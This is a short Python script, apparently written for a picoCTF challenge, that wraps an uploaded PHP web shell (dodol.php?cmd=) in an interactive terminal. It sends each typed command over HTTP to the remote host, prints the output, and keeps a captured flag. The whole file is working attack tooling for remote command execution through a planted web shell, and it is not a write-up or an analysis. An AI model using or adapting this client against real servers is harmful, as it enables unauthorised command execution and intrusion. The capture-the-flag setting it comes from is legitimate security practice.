import requests
from cmd import Cmd
from bs4 import BeautifulSoup


class Terminal(Cmd):
    prompt = "kali㉿kali $ "
    url="http://standard-pizzas.picoctf.net:58778/uploads/dodol.php?cmd="
    flag=""

    def __init__(self):
        super().__init__()

    def default(self, args):
        payload = args
        response = requests.get(self.url + payload)
        print(response.text)
        

    def do_Flag(self, args):
        self.flag= args
        print("Flag saved")

    def do_exit(self, args):
        print(f"Thankyou plz submit the flag {self.flag}")
        exit()

c = Terminal()
c.cmdloop()

    
